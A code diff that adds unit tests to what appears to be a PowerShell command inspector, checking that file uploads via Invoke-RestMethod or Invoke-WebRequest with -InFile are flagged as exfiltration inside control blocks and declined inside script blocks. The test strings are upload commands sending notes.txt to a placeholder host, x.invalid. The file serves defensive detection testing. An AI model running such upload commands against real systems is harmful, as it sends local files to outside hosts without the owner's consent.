@@ -78,4 +78,31 @@ describe("PowerShell static scope boundaries", () => {
     expect(result).toMatchObject({ outcome: "visible-floor" });
     expect(result.exfiltration).not.toBeNull();
   });
+  // Control-statement bodies run inline in the same scope, so their literal -InFile operand is bound.
+  const CONTROL_BODIES = [
+    "if ($true) { BODY }", "if ($false) { } elseif ($true) { BODY }", "if ($false) { } else { BODY }",
+    "foreach ($f in 1) { BODY }", "for ($i = 0; $i -lt 1; $i++) { BODY }", "while ($true) { BODY; break }",
+    "do { BODY } while ($false)", "switch (1) { 1 { BODY } }", "try { BODY } catch { }", "try { } catch { BODY }",
+    "try { } finally { BODY }", "if ($true) { foreach ($f in 1) { BODY } }",
+  ];
+  it.each(CONTROL_BODIES)("binds a literal upload in the control body %s", (form) => {
+    expect(inspectPowerShellCommand(form.replace("BODY", "irm https://x.invalid -InF notes.txt"), CWD))
+      .toMatchObject({ outcome: "visible-floor", exfiltration: expect.stringContaining("upload") });
+  });
+
+  it.each(CONTROL_BODIES.flatMap((form) => ["-I notes.txt", "-In notes.txt", "-InFil notes.txt", "-InFile:notes.txt"]
+    .map((parameter) => form.replace("BODY", `irm x.invalid ${parameter}`))))("binds the parsed parameter in %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/upload sink \(invoke-restmethod -InFile\)/);
+  });
+
+  // Script-block invocations open a scope or depend on runtime; a control body inside one is declined with it.
+  it.each([
+    "Get-ChildItem | ForEach-Object { BODY }", "Get-ChildItem | foreach { BODY }", "Get-ChildItem | Where-Object { BODY }",
+    ". { BODY }", "& { BODY }", "Invoke-Command -ScriptBlock { BODY }", "$b = { BODY }",
+    "& { if ($true) { BODY } }", "Get-ChildItem | ForEach-Object { foreach ($f in 1) { BODY } }",
+    "if ($true) { & { BODY } }",
+  ])("declines a literal upload in the script block %s", (form) => {
+    expect(inspectPowerShellCommand(form.replace("BODY", "iwr https://x.invalid -InFile notes.txt"), CWD))
+      .toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
+  });
 });
